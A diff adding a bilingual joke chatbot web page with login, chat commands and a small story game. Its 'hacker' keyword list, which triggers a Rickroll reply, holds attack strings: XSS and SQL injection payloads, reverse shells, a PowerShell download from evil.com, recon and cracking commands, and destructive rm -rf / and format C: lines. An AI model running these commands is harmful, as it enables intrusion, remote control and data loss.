@@ -1,0 +1,1020 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DID YOU GET LOST ?</title>
+<style>
+/* Font + Reset + Background */
+:root{
+  --paper:#ffffff;  /* Background */
+  --ink:#000000;    /* Font + Edge */
+  --grey:#2b2b2b;   /* Tag/Note + tương phản ~7.4:1 */
+  --font:ui-monospace,"SFMono-Regular",Menlo,Consolas,"Liberation Mono",monospace; /* System Fonts */
+}
+*{box-sizing:border-box}
+html{background:var(--paper)}
+/* Just read this elements man.  */
+body{margin:0;padding:20px;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;
+  background:var(--paper);color:var(--ink);font-family:var(--font)}
+
+/* Terminal + thanh trên (tên + nút) + Header, phụ đề */
+.terminal{width:100%;max-width:1000px;background:var(--paper);border:2px solid var(--ink);padding:28px 32px 22px}
+.topbar{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--ink);
+  padding-bottom:8px;margin-bottom:14px;font-size:12px;letter-spacing:.06em;color:var(--grey)}
+.topbar b{color:var(--ink)}
+.hangup{background:var(--paper);border:1px solid var(--ink);color:var(--ink);font:11px var(--font);
+  letter-spacing:.06em;padding:4px 8px;cursor:pointer}
+.hangup:hover{background:var(--ink);color:var(--paper)}
+.hangup:focus-visible{outline:2px solid var(--ink);outline-offset:2px}
+h1{font-size:48px;line-height:1;letter-spacing:.03em;margin:2px 0}
+.subtitle{font-size:13px;color:var(--grey);margin-bottom:16px}
+
+[hidden]{display:none !important}
+.top-actions{display:flex;align-items:center;gap:8px;flex-wrap:wrap;justify-content:flex-end}
+.account-label{font-size:11px;color:var(--ink);overflow-wrap:anywhere;max-width:260px}
+.sync-status{font-size:10px;letter-spacing:.04em;color:var(--grey);white-space:nowrap}
+.auth-panel{max-width:560px}
+.auth-kicker{font-size:11px;color:var(--grey);letter-spacing:.08em;margin:18px 0 10px}
+.auth-form{display:grid;gap:8px;max-width:460px}
+.auth-form label{font-size:11px;font-weight:700;letter-spacing:.06em;margin-top:7px}
+.auth-control{width:100%;min-width:0;background:var(--paper);border:1px solid var(--ink);border-radius:0;padding:10px 9px;color:var(--ink);font:14px var(--font)}
+.auth-control:focus-visible{outline:2px solid var(--ink);outline-offset:2px}
+.auth-actions{display:flex;gap:8px;flex-wrap:wrap;margin-top:10px}
+.auth-action{background:var(--paper);border:1px solid var(--ink);border-radius:0;color:var(--ink);font:11px var(--font);letter-spacing:.06em;padding:9px 12px;cursor:pointer}
+.auth-action.primary{background:var(--ink);color:var(--paper)}
+.auth-action:hover{background:var(--ink);color:var(--paper)}
+.auth-action:disabled{opacity:.5;cursor:wait}
+.auth-message{min-height:1.5em;margin-top:12px;font-size:12px;color:var(--grey);overflow-wrap:anywhere}
+.auth-hint{font-size:11px;color:var(--grey);line-height:1.5;margin-top:8px}
+@media (max-width:480px){
+  .terminal{padding:20px 16px 18px}
+  .account-label{max-width:150px}
+  .topbar{align-items:flex-start}
+  .top-actions{gap:5px}
+}
+
+/* Vùng log cuộn + kiểu từng loại dòng (JS chỉ gắn class, không gắn style) */
+#log{height:480px;overflow-y:auto;padding-right:6px;margin-bottom:10px;font-size:14.5px;line-height:1.55;
+  scrollbar-width:thin;scrollbar-color:var(--ink) var(--paper)}
+/* overflow-wrap */
+.line{white-space:pre-wrap;overflow-wrap:anywhere;margin-bottom:2px}
+.line:empty{min-height:1.55em}
+.sys,.tag,.reply-note{color:var(--grey)}
+.reply-main{font-weight:700}
+.reply-note{padding-left:16px;font-size:13px;margin-bottom:10px}
+
+/* Story mode: dialogue continues in the same scrollable log; choices are clickable, not numbered input. */
+.game-speaker{font-weight:700;color:var(--ink)}
+.game-choices{display:grid;gap:7px;margin:14px 0 18px;padding:12px 0 0;border-top:1px dashed var(--grey)}
+.game-choice-heading{font-size:11px;font-weight:700;letter-spacing:.08em;color:var(--grey);margin-bottom:2px}
+.game-choice{display:flex;align-items:flex-start;gap:10px;width:100%;padding:9px 11px;border:1px solid var(--ink);border-radius:0;background:var(--paper);color:var(--ink);font:13px/1.5 var(--font);text-align:left;cursor:pointer}
+.game-choice:hover,.game-choice:focus-visible{background:var(--ink);color:var(--paper)}
+.game-choice:focus-visible,.game-quit:focus-visible{outline:2px solid var(--ink);outline-offset:3px}
+.game-choice:disabled{opacity:.45;cursor:not-allowed}
+.game-choice-number{flex:0 0 28px;color:var(--grey)}
+.game-choice:hover .game-choice-number,.game-choice:focus-visible .game-choice-number{color:var(--paper)}
+.game-quit{justify-self:start;margin-top:5px;padding:4px 0;border:0;border-radius:0;background:transparent;color:var(--grey);font:11px var(--font);text-decoration:underline;cursor:pointer}
+.game-quit:hover{color:var(--ink)}
+
+/* Hàng nhập (ẩn tới khi boot xong), ô input, chân trang, màn nhỏ, giảm chuyển động */
+.input-row{display:flex;align-items:center;gap:8px;border-top:1px solid var(--ink);padding-top:10px;opacity:0;transition:opacity .4s ease}
+.input-row.ready{opacity:1}
+.prompt-label{font-weight:700;white-space:nowrap}
+#userInput{flex:1;min-width:0;background:transparent;border:none;color:var(--ink);font:15px var(--font);caret-color:var(--ink)}
+#userInput:focus{outline:none}
+#userInput:focus-visible{outline:2px solid var(--ink);outline-offset:3px}   /* đặt SAU :focus để không bị đè (cùng độ ưu tiên) */
+#userInput::placeholder{color:var(--grey)}
+#userInput:disabled{opacity:.4}
+.footer{margin-top:12px;font-size:11px;color:var(--grey);display:flex;justify-content:space-between;gap:8px}
+@media (max-width:480px){h1{font-size:36px}#log{height:280px;font-size:13.5px}}
+@media (prefers-reduced-motion:reduce){.input-row{transition:none}}
+</style>
+</head>
+<body>
+
+<!-- Main terminal UI. Authentication and chat share the same square-corner visual style. -->
+<div class="terminal">
+  <div class="topbar">
+    <span>Chatting &middot; <b>Did you get lost?</b></span>
+    <div class="top-actions">
+      <span class="account-label" id="accountLabel" hidden></span>
+      <span class="sync-status" id="syncStatus" aria-live="polite" hidden>SYNC: READY</span>
+      <button class="hangup" id="logoutBtn" type="button" hidden>LOGOUT</button>
+      <button class="hangup" id="hangupBtn" type="button" hidden>RESET</button>
+    </div>
+  </div>
+
+  <section class="auth-panel" id="authPanel">
+    <h1>DID YOU GET LOST ?</h1>
+    <div class="subtitle">Welcome to my web.</div>
+    <div class="auth-kicker" id="authHeading">ACCOUNT / SIGN IN</div>
+    <form class="auth-form" id="authForm" autocomplete="on">
+      <label for="authEmail">EMAIL</label>
+      <input class="auth-control" id="authEmail" type="email" maxlength="254"
+             autocomplete="username" placeholder="you@example.com" required>
+      <label for="authPassword">PASSWORD</label>
+      <input class="auth-control" id="authPassword" type="password" minlength="10" maxlength="128"
+             autocomplete="current-password" placeholder="At least 10 characters" required>
+      <div class="auth-actions">
+        <button class="auth-action primary" id="authSubmit" type="submit">SIGN IN</button>
+        <button class="auth-action" id="authToggle" type="button">CREATE ACCOUNT</button>
+      </div>
+    </form>
+    <div class="auth-message" id="authMessage" role="status" aria-live="polite"></div>
+    <div class="auth-hint" id="authHint">Use your email and password to access your saved chat settings and history.</div>
+  </section>
+
+  <div id="appShell" hidden>
+    <h1>DID YOU GET LOST ?</h1>
+    <div class="subtitle">Welcome to my web.</div>
+    <div id="log"></div>
+    <form class="input-row" id="inputRow" autocomplete="off">
+      <label class="prompt-label" for="userInput">HERE &gt;</label>
+      <input id="userInput" maxlength="200" spellcheck="false" placeholder="Input and Enter..." disabled>
+    </form>
+    <div class="footer"><span id="clock">TIME TO CONNECTION 00:00</span><span id="footerMeta">ACCOUNT STORAGE / SERVER</span></div>
+  </div>
+</div>
+
+<script>
+window.DYGL_CONFIG = { csrfToken: {{ csrf_token|tojson }} };
+
+// Hàm bổ trợ lấy ngẫu nhiên 1 phần tử trong mảng
+const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];
+
+const CONFIG = {
+  bootLines: ["Hello,", "You've wandered quite far, anyway: Welcome."],
+  hint: "Text and Enter.",
+  youTag: "WHOAMI > ",
+  DYGLTag: "ROBERT > ",
+  noteArrow: "VI > ",
+  clockLabel: "TIME TO CONNECTION",
+  speedBoot: 14, speedReply: 18,   // ms mỗi ký tự
+  thinkDelay: 300, bootPause: 180,  // ms
+
+  defaultName: "WHOAMI",
+  namePrompt: "ROBERT > Who are you?",
+  nameGreeting: name => {
+    const list = [
+      `No one knows who they are in this universe. But I know your name is ${name}, interesting.`,
+      `So this is how I and you call you, ${name}.`
+    ];
+    return getRandom(list);
+  },
+  nameChanged: name => `You have redefined yourself: ${name}.`,
+  unknownCommand: cmd => `ROBERT > "/${cmd}" is invalid.`,
+  helpHeader: "Command List:",
+  historyEmpty: "No history found.",
+  gameHint: "Choose an option below.",
+  gameInvalidChoice: name => `Invalid choice.`,
+  get gameLocked() {
+    const list = [
+      "I will see you tomorrow, okay?",
+      "Please wait until tomorrow."
+    ];
+    return getRandom(list);
+  },
+  gameQuit: name => `Goodbye, ${name}.`,
+  gameFarewell: name => `See you later, ${name}.`,
+  chatExitMsg: "RESET for again.",
+};
+
+const phraseBank = [
+  {
+    name: "xinchao",
+    keywords: ["chao", "hi", "bonjour", "hello", "cc", "hola", "hallo", "wtf", ":)"],
+    entries: () => getRandom([
+      { de: "Hallo, was ist neu?", vi: "Chào, có gì mới à?" },
+      { de: "Ah, du bist wieder da.", vi: "À, cậu lại đến rồi." },
+      { de: "Willkommen zurück.", vi: "Chào mừng trở lại." },
+    ]),
+  },
+  {
+    name: "thoitiet",
+    keywords: ["thoi tiet", "mua", "nang", "lanh", "nong", "weather"],
+    entries: () => getRandom([
+      { de: "Erm...", vi: "À..." },
+      { de: "Das Wetter draußen ist egal, oder?", vi: "Thời tiết bên ngoài đâu có quan trọng, đúng không?" },
+    ]),
+  },
+  {
+    name: "cv",
+    keywords: ["cong viec", "lam viec", "di lam", "project", "work", "deadline", "sep", "du an"],
+    entries: () => getRandom([
+      { de: "Ich bin auch~ Sehr müde... Bist du beschäftigt?", vi: "Tui cũng vậy, mệt vãi ò... Bận lắm à?" },
+      { de: "Arbeiten, arbeiten... Vergesst nicht zu atmen.", vi: "Làm việc, làm việc... Đừng quên thở đấy." },
+    ]),
+  },
+  {
+    name: "hacker",
+    keywords: [
+      // 1. Hack & Web Injection (XSS, SQLi, Command Injection)
+      "hack",
+      "<script>",
+      "<img src=x onerror=alert('hack')>",
+      "javascript:alert(document.cookie)",
+      "admin' OR '1'='1",
+      "' UNION SELECT NULL, username, password FROM users--",
+      "; cat /etc/passwd",
+      "| id",
+      "`whoami`",
+
+      // 2. Pentest & Reconnaissance (Lệnh & Công cụ)
+      "pentest",
+      "nmap -sV -p- 192.168.1.1",
+      "gobuster dir -u http://target.com -w words.txt",
+      "nikto -h http://target.com",
+      "sqlmap -u 'http://target.com/page?id=1' --batch",
+      "hydra -l admin -P pass.txt ssh://192.168.1.1",
+      "msfconsole",
+      "burpsuite",
+      "wireshark",
+
+      // 3. Mật khẩu & Passwords (Dạng băm, bẻ khóa, chuỗi mẫu)
+      "mat khau",
+      "password",
+      "123456",
+      "password123",
+      "admin123",
+      "john --wordlist=rockyou.txt hash.txt",
+      "hashcat -m 0 -a 0 hash.txt rockyou.txt",
+      "5f4dcc3b5aa765d61d8327deb882cf99", // md5 of "password"
+      "$2a$12$e8N...",
+
+      // 4. Máy tính & Shell Execution (Reverse shell, Remote execution)
+      "may tinh",
+      "nc -e /bin/sh 10.0.0.1 4444",
+      "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"10.0.0.1\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+      "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
+      "cmd.exe /c calc.exe",
+      "rm -rf / --no-preserve-root",
+      "format C: /Q /Y",
+    ],
+    entries: () => getRandom([
+      {
+        de: "Hmmmm... das ist wirklich kein Rickroll:",
+        vi: "Nó chắc chắn không phải rickroll:",
+        linkUrl: "https://youtu.be/dQw4w9WgXcQ",
+      },
+    ]),
+  },
+];
+
+const fallbackBank = [
+  {
+    de: "Hmmmm... das ist wirklich kein Rickroll:",
+    vi: "Nó chắc chắn không phải rickroll:",
+    linkUrl: "https://youtu.be/dQw4w9WgXcQ",
+  },
+  { de: "Ok?", vi: "Ok?" },
+];
+
+
+function normalize(s){   // bỏ dấu + chữ thường (đã bỏ replace(/Đ/) dư vì toLowerCase đã đổi Đ -> đ)
+  return s.toLowerCase().replace(/đ/g, "d").normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+}
+const asWords = s => " " + normalize(s).replace(/[^\p{L}\p{N}]+/gu, " ").trim() + " ";
+let BANK = []; // Chỉ khai báo BANK một lần; refreshBank() sẽ cập nhật mảng này.
+
+function pickReply(raw){
+  const text = asWords(raw);
+  const hits = BANK.filter(category => category.keys.some(key => text.includes(key)));
+
+  // Không có nhóm từ khóa phù hợp: chọn câu dự phòng hoặc câu người dùng tự thêm.
+  if (!hits.length) {
+    const savedCustom = Store.get("custom_phrases", []);
+    const customReplies = Array.isArray(savedCustom) ? savedCustom : [];
+    return getRandom([...fallbackBank, ...customReplies]);
+  }
+
+  // Có thể có nhiều nhóm cùng khớp; chọn ngẫu nhiên một nhóm.
+  const category = getRandom(hits);
+
+  // entries có thể là hàm trả về một câu ngẫu nhiên hoặc một mảng câu.
+  return typeof category.entries === "function"
+    ? category.entries()
+    : getRandom(category.entries);
+}
+
+// [J4] Tham chiếu DOM + helper dựng dòng/gõ chữ + cơ chế hủy tác vụ dở khi bấm nút reset
+const $ = id => document.getElementById(id);
+const log = $("log"), inputRow = $("inputRow"), userInput = $("userInput"), hangupBtn = $("hangupBtn"), clockEl = $("clock");
+const reducedMotion = () => matchMedia("(prefers-reduced-motion: reduce)").matches;   // [FIX-13] đọc mỗi lần, không chốt 1 lần
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const toBottom = () => { log.scrollTop = log.scrollHeight; };
+let session = 0;   // [FIX-11] tăng mỗi lần reset; tác vụ async cũ thấy sid khác session thì tự dừng
+function span(cls, text){ const s = document.createElement("span"); s.className = cls; s.textContent = text; return s; }
+function addLine(cls, text = ""){ const d = document.createElement("div"); d.className = "line " + cls; d.textContent = text; log.append(d); toBottom(); return d; }
+async function typeInto(el, text, speed, sid){
+  const safeText = String(text ?? "");
+  if (sid !== session) return false;
+
+  // prefers-reduced-motion: hiện toàn bộ chữ ngay, nhưng vẫn dùng textContent.
+  if (reducedMotion()) {
+    el.textContent = safeText;
+    toBottom();
+    return sid === session;
+  }
+
+  for (let i = 1; i <= safeText.length; i++) {
+    if (sid !== session) return false;
+    el.textContent = safeText.slice(0, i);
+    toBottom();
+    await sleep(speed);
+  }
+
+  return sid === session;
+}
+
+let mode = "name";
+function setMode(next){
+  mode = next;
+  const storyMode = next === "game";
+  inputRow.hidden = storyMode;
+  userInput.placeholder =
+    next === "name" ? "NAME and ENTER..." :
+    storyMode ? "Choose an option in the dialogue..." :
+    "/help for command or just chatting... :v";
+
+  if (storyMode){
+    userInput.disabled = true;
+  } else if (next === "chat" && inputRow.classList.contains("ready")){
+    userInput.disabled = false;
+  }
+}
+
+// Account-backed Store: synchronous reads keep the original chat/game logic intact;
+// writes are debounced and synchronized to the authenticated user's PostgreSQL record.
+const DEFAULT_ACCOUNT_STATE = {
+  name: null,
+  langMode: "de_vi",
+  custom_phrases: [],
+  history: [],
+  lastPlayed: null,
+};
+let accountState = { ...DEFAULT_ACCOUNT_STATE };
+let csrfToken = window.DYGL_CONFIG.csrfToken;
+let isAuthenticated = false;
+let saveTimer = null;
+let saveQueue = Promise.resolve();
+
+function setSyncStatus(message){
+  const el = $("syncStatus");
+  if (el) el.textContent = message;
+}
+
+async function apiRequest(url, options = {}){
+  const method = (options.method || "GET").toUpperCase();
+  const headers = { ...(options.headers || {}) };
+  let body = options.body;
+
+  if (body !== undefined && body !== null && typeof body !== "string"){
+    headers["Content-Type"] = "application/json";
+    body = JSON.stringify(body);
+  }
+  if (!["GET", "HEAD", "OPTIONS"].includes(method)){
+    headers["X-CSRF-Token"] = csrfToken;
+  }
+
+  const response = await fetch(url, {
+    ...options,
+    method,
+    headers,
+    body,
+    credentials: "same-origin",
+  });
+  const payload = await response.json().catch(() => ({}));
+  if (!response.ok){
+    const error = new Error(payload.error || `Request failed (${response.status}).`);
+    error.status = response.status;
+    throw error;
+  }
+  return payload;
+}
+
+function scheduleStateSave(){
+  if (!isAuthenticated) return;
+  clearTimeout(saveTimer);
+  setSyncStatus("SYNC: PENDING");
+  saveTimer = setTimeout(() => {
+    saveTimer = null;
+    const snapshot = JSON.stringify(accountState);
+    saveQueue = saveQueue.catch(() => {}).then(async () => {
+      await apiRequest("/api/state", { method: "PUT", body: JSON.parse(snapshot) });
+      setSyncStatus("SYNC: SAVED");
+    }).catch(error => {
+      console.error("State synchronization failed:", error);
+      setSyncStatus("SYNC: ERROR");
+    });
+  }, 450);
+}
+
+async function flushState(){
+  if (!isAuthenticated) return;
+  clearTimeout(saveTimer);
+  saveTimer = null;
+  const snapshot = JSON.stringify(accountState);
+  saveQueue = saveQueue.catch(() => {}).then(() =>
+    apiRequest("/api/state", { method: "PUT", body: JSON.parse(snapshot) })
+  );
+  await saveQueue;
+  setSyncStatus("SYNC: SAVED");
+}
+
+const Store = {
+  get(key, fallback = null){
+    return Object.prototype.hasOwnProperty.call(accountState, key)
+      ? accountState[key]
+      : fallback;
+  },
+  set(key, value){
+    if (!Object.prototype.hasOwnProperty.call(DEFAULT_ACCOUNT_STATE, key)) return false;
+    accountState[key] = value;
+    scheduleStateSave();
+    return true;
+  },
+};
+
+function applyAccountState(state){
+  const source = state && typeof state === "object" ? state : {};
+  accountState = {
+    name: typeof source.name === "string" ? source.name : null,
+    langMode: typeof source.langMode === "string" ? source.langMode : "de_vi",
+    custom_phrases: Array.isArray(source.custom_phrases) ? source.custom_phrases : [],
+    history: Array.isArray(source.history) ? source.history.slice(-200) : [],
+    lastPlayed: typeof source.lastPlayed === "string" ? source.lastPlayed : null,
+  };
+  if (typeof LANG_MODES !== "undefined"){
+    if (!LANG_MODES[accountState.langMode]) accountState.langMode = "de_vi";
+    langMode = accountState.langMode;
+  }
+}
+
+function setAuthMessage(message){
+  $("authMessage").textContent = message || "";
+}
+
+let authMode = "login";
+function setAuthMode(nextMode){
+  authMode = nextMode === "register" ? "register" : "login";
+  $("authHeading").textContent = authMode === "register" ? "ACCOUNT / CREATE ACCOUNT" : "ACCOUNT / SIGN IN";
+  $("authSubmit").textContent = authMode === "register" ? "REGISTER" : "SIGN IN";
+  $("authToggle").textContent = authMode === "register" ? "BACK TO SIGN IN" : "CREATE ACCOUNT";
+  $("authPassword").setAttribute("autocomplete", authMode === "register" ? "new-password" : "current-password");
+  $("authHint").textContent = authMode === "register"
+    ? "Password must contain 10–128 characters. Use a password you do not reuse elsewhere."
+    : "Use your email and password to access your saved chat settings and history.";
+  setAuthMessage("");
+}
+
+async function enterAuthenticatedApp(payload){
+  csrfToken = payload.csrfToken || csrfToken;
+  applyAccountState(payload.state);
+  isAuthenticated = true;
+
+  $("authPanel").hidden = true;
+  $("appShell").hidden = false;
+  $("accountLabel").hidden = false;
+  $("accountLabel").textContent = payload.user?.email || "ACCOUNT";
+  $("syncStatus").hidden = false;
+  $("logoutBtn").hidden = false;
+  $("hangupBtn").hidden = false;
+  setSyncStatus("SYNC: SAVED");
+
+  await runBoot();
+}
+
+async function restoreAccountSession(){
+  try{
+    const payload = await apiRequest("/api/auth/me");
+    await enterAuthenticatedApp(payload);
+  }catch(error){
+    $("authPanel").hidden = false;
+    $("appShell").hidden = true;
+    if (error.status !== 401){
+      setAuthMessage(`Cannot connect to the account server: ${error.message}`);
+    }
+  }
+}
+
+async function logoutAccount(){
+  try{
+    await flushState();
+  }catch(error){
+    console.error("Could not save the final state before logout:", error);
+    setSyncStatus("SYNC: ERROR");
+  }
+  try{
+    const result = await apiRequest("/api/auth/logout", { method: "POST" });
+    csrfToken = result.csrfToken || csrfToken;
+  }catch(error){
+    setAuthMessage(`Logout failed: ${error.message}`);
+    return;
+  }
+
+  session++;
+  gameState = null;
+  gameBusy = false;
+  isAuthenticated = false;
+  accountState = { ...DEFAULT_ACCOUNT_STATE };
+  langMode = "de_vi";
+  log.replaceChildren();
+  userInput.value = "";
+  userInput.disabled = true;
+  inputRow.classList.remove("ready");
+  $("accountLabel").hidden = true;
+  $("syncStatus").hidden = true;
+  $("logoutBtn").hidden = true;
+  $("hangupBtn").hidden = true;
+  $("appShell").hidden = true;
+  $("authPanel").hidden = false;
+  $("authPassword").value = "";
+  setAuthMode("login");
+  setAuthMessage("Signed out.");
+}
+
+const MAX_LOG = 200;
+function logMessage(who, text){
+  const saved = Store.get("history", []);
+  const hist = Array.isArray(saved) ? saved : [];
+  hist.push({ who, text, ts: Date.now() });
+  Store.set("history", hist.slice(-MAX_LOG));
+}
+function showHistory(n = 10){
+  const count = Number.isFinite(n) ? Math.max(1, Math.min(MAX_LOG, Math.floor(n))) : 10;
+  const saved = Store.get("history", []);
+  const hist = (Array.isArray(saved) ? saved : []).slice(-count);
+  if (!hist.length){ addLine("sys", CONFIG.historyEmpty); return; }
+  hist.forEach(h => {
+    const time = new Date(h.ts).toLocaleTimeString("vi-VN");
+    addLine("sys", `[${time}] ${h.who}: ${h.text}`);
+  });
+}
+//LANG MODE
+const LANG_MODES = {
+  de_vi: { main: "de", note: "vi", label: "DE + VI" },
+  vi_de: { main: "vi", note: "de", label: "VI + DE" },
+  de:    { main: "de", note: null, label: "DE ONLY" },
+  vi:    { main: "vi", note: null, label: "VI ONLY" },
+  en_vi: { main: "en", note: "vi", label: "EN + VI" },
+};
+
+let langMode = LANG_MODES[Store.get("langMode")] ? Store.get("langMode") : "de_vi";
+
+function setLangMode(nextMode){
+  if (!LANG_MODES[nextMode]) return false;
+  langMode = nextMode;
+  Store.set("langMode", nextMode);
+  return true;
+}
+
+// Lấy text theo ngôn ngữ mong muốn, có fallback nếu câu đó thiếu ngôn ngữ
+function pickLangText(entry, lang){
+  if (!lang || !entry) return "";
+  if (entry[lang]) return entry[lang];
+  return entry.de || entry.vi || entry.en || entry.reply || "";
+}
+
+// [N1] Luồng hỏi tên — MỚI. Chạy một lần khi chưa có tên lưu trong Store.
+async function submitName(text, sid){
+  const name = (text || CONFIG.defaultName).trim().slice(0, 24) || CONFIG.defaultName;
+  Store.set("name", name);
+  addLine("you").append(span("tag", CONFIG.youTag), text || "(bỏ trống)");
+  toBottom();
+  await sleep(CONFIG.thinkDelay);
+  if (sid !== session) return;
+  if (!(await typeInto(addLine("sys"), CONFIG.nameGreeting(name), CONFIG.speedReply, sid))) return;
+  addLine("sys"); addLine("sys", CONFIG.hint); addLine("sys");
+  setMode("chat");
+  inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
+}
+function setName(newName){   // dùng cho lệnh /name khi đang chat, khác với submitName (lúc mới vào)
+  const name = (newName || CONFIG.defaultName).trim().slice(0, 24) || CONFIG.defaultName;
+  Store.set("name", name);
+  addLine("sys", CONFIG.nameChanged(name));
+}
+
+// [CMD1] Mọi tin nhắn bắt đầu bằng "/" được coi là LỆNH thay vì chat thường —
+// MỚI. Cú pháp: /tên_lệnh tham_số... Thêm lệnh mới = thêm một mục vào đây.
+const COMMANDS = {
+  help:    { desc: "Command List:",
+             run: () => { addLine("sys", CONFIG.helpHeader);
+                           Object.entries(COMMANDS).forEach(([k, v]) => addLine("sys", `  /${k} — ${v.desc}`)); } },
+  name:    { desc: "Name changing (/name <new-name>).",
+             run: args => setName(args.join(" ")) },
+  clear:   { desc: "Clear your log.",
+             run: () => log.replaceChildren() },
+  history: { desc: "History default 10 lines.",
+             run: args => showHistory(Number(args[0]) || 10) },
+  game:    { desc: "Start game.",
+             run: () => startGame() },
+  exit:    { desc: "Goodbye.",
+             run: () => { addLine("sys", CONFIG.chatExitMsg); inputRow.classList.remove("ready"); userInput.disabled = true; } },
+  add:     { desc: "Add fallback replies (/add reply1, vi1; reply2, vi2).",
+             run: args => {
+               // args là mảng các từ sau chữ /add, nối lại thành chuỗi đầy đủ
+               const content = args.join(" ");
+               const resultMsg = handleAddCustomPhrases(content);
+               addLine("sys", resultMsg);
+             } },
+  lang: {
+      desc: "Switch language mode (/lang de_vi | vi_de | de | vi | en_vi).",
+      run: args => {
+        const key = (args[0] || "").toLowerCase();
+        if (!key){
+          addLine("sys", `Current language mode: ${langMode} (${Object.keys(LANG_MODES).join(", ")})`);
+          return;
+        }
+        if (!setLangMode(key)){
+          addLine("sys", `Invalid language mode "${key}". Available: ${Object.keys(LANG_MODES).join(", ")}`);
+          return;
+        }
+        addLine("sys", `Language switched to ${langMode} (${LANG_MODES[langMode].label}).`);
+      }
+    },
+};
+async function runCommand(raw){
+  const tokens = raw.slice(1).trim().split(/\s+/);
+  const cmd = (tokens.shift() || "").toLowerCase();
+  const entry = COMMANDS[cmd];
+  if (!entry){ addLine("sys", CONFIG.unknownCommand(cmd)); return; }
+  await entry.run(tokens);
+}
+
+// BANK chỉ chứa các nhóm từ khóa cố định trong phraseBank.
+// Câu người dùng thêm bằng /add được lưu riêng và dùng làm câu trả lời dự phòng.
+function refreshBank(){
+  BANK = phraseBank.map(category => ({
+    ...category,
+    keys: category.keywords.map(asWords)
+  }));
+}
+
+// Chạy một lần khi trang khởi động để chuẩn hóa từ khóa.
+refreshBank();
+
+function handleAddCustomPhrases(inputStr){
+  const lines = inputStr.split(";").map(line => line.trim()).filter(Boolean);
+  if (!lines.length) return "Cú pháp không hợp lệ hoặc rỗng.";
+
+  const newEntries = [];
+  for (const line of lines){
+    const parts = line.split("|").map(p => p.trim());
+    const de = parts[0] || "";
+    const vi = parts[1] || de;
+    const en = parts[2] || de;
+    if (de) newEntries.push({ de, vi, en });
+  }
+
+  if (!newEntries.length) return "Không tìm thấy câu hợp lệ để thêm.";
+
+  const saved = Store.get("custom_phrases", []);
+  const customList = Array.isArray(saved) ? saved : [];
+  const updatedList = [...customList, ...newEntries].slice(-100);
+
+  if (!Store.set("custom_phrases", updatedList)){
+    return "Không thể cập nhật bộ nhớ tài khoản.";
+  }
+
+  return `Đã thêm ${newEntries.length} câu vào nhóm trả lời dự phòng.`;
+}
+
+// [GAME1] STORY CONTENT — edit STORY and STORY_START_NODE only.
+// Each node is one stretch of scrolling dialogue followed by clickable choices.
+// lines accepts plain strings or { speaker, text } objects.
+// choices accepts { label, next }; there are no Next/Back controls.
+const STORY_START_NODE = "start";
+const STORY = {
+  start: {
+    lines: [
+      "Một đêm mưa, {name} nhận được một tin nhắn lạ...",
+      { speaker: "ROBERT", text: "Bạn có muốn mở nó không?" },
+    ],
+    choices: [
+      { label: "Mở tin nhắn", next: "open" },
+      { label: "Bỏ qua, tắt máy", next: "end_ignore" },
+    ],
+  },
+  open: {
+    lines: [
+      "Tin nhắn chỉ có một dòng: 'Đừng tin ai.'",
+      { speaker: "ROBERT", text: "Cậu sẽ làm gì?" },
+    ],
+    choices: [
+      { label: "Trả lời: 'Ai đó?'", next: "end_reply" },
+      { label: "Chặn số lạ", next: "end_block" },
+    ],
+  },
+  end_ignore: { lines: ["Bạn tắt máy đi ngủ. Có lẽ đó là lựa chọn khôn ngoan nhất."], end: true },
+  end_reply:  { lines: ["Không có phản hồi nào nữa... cho đến ngày mai."], end: true },
+  end_block:  { lines: ["Số lạ bị chặn. Nhưng một số khác đã nhắn tới..."], end: true },
+};
+
+// [GAME2] STORY ENGINE — do not edit this section when writing the story.
+let gameState = null;
+let gameBusy = false;
+
+function todayKey(){
+  const d = new Date();
+  const year = d.getFullYear();
+  const month = String(d.getMonth() + 1).padStart(2, "0");
+  const day = String(d.getDate()).padStart(2, "0");
+  return `${year}-${month}-${day}`;
+}
+function isGameLockedToday(){ return Store.get("lastPlayed") === todayKey(); }
+
+function returnToChat(){
+  gameState = null;
+  gameBusy = false;
+  setMode("chat");
+  inputRow.classList.add("ready");
+  userInput.disabled = false;
+  userInput.focus();
+}
+
+function showGameChoices(node){
+  const panel = document.createElement("section");
+  panel.className = "game-choices";
+  panel.setAttribute("role", "group");
+  panel.setAttribute("aria-label", "Story choices");
+
+  const heading = document.createElement("div");
+  heading.className = "game-choice-heading";
+  heading.textContent = "CHOOSE YOUR ACTION";
+  panel.append(heading);
+
+  node.choices.forEach((choice, index) => {
+    const button = document.createElement("button");
+    button.type = "button";
+    button.className = "game-choice";
+    button.disabled = !choice || typeof choice.label !== "string" || !STORY[choice.next];
+
+    const number = document.createElement("span");
+    number.className = "game-choice-number";
+    number.textContent = `[${String(index + 1).padStart(2, "0")}]`;
+
+    const label = document.createElement("span");
+    label.textContent = String(choice?.label ?? "Invalid choice");
+    button.append(number, label);
+    button.addEventListener("click", () => chooseGameOption(choice, panel));
+    panel.append(button);
+  });
+
+  const quit = document.createElement("button");
+  quit.type = "button";
+  quit.className = "game-quit";
+  quit.textContent = "[ QUIT STORY ]";
+  quit.addEventListener("click", quitGame);
+  panel.append(quit);
+
+  log.append(panel);
+  gameBusy = false;
+  toBottom();
+}
+
+async function startGame(){
+  if (isGameLockedToday()){
+    addLine("sys", CONFIG.gameLocked);
+    return;
+  }
+  if (!STORY[STORY_START_NODE]){
+    addLine("sys", "Game configuration error: start node not found.");
+    return;
+  }
+
+  gameState = { node: STORY_START_NODE };
+  gameBusy = true;
+  setMode("game");
+  await playNode();
+}
+
+async function playNode(){
+  if (!gameState) return;
+  gameBusy = true;
+  const sid = session;
+  const node = STORY[gameState.node];
+
+  if (!node || !Array.isArray(node.lines)){
+    addLine("sys", "Game configuration error: node is missing or invalid.");
+    returnToChat();
+    return;
+  }
+
